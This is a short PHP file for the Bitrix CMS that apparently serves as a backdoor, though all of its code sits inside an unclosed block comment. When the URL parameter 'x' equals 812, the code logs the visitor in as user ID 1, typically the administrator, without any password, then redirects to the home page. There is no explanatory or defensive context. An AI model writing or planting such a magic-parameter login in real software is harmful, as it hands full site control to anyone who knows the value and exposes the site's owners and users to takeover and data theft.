<?php
/*
require($_SERVER['DOCUMENT_ROOT'] . '/bitrix/header.php');
global $USER;
if($_GET['x']!=812){
exit;
	
}
$USER->Authorize(1);

//$rsUser = CUser::GetByID(1);
 //   $arUser = $rsUser->Fetch();

echo $USER->LAST_ERROR;
header('location:/');
//l($arUser);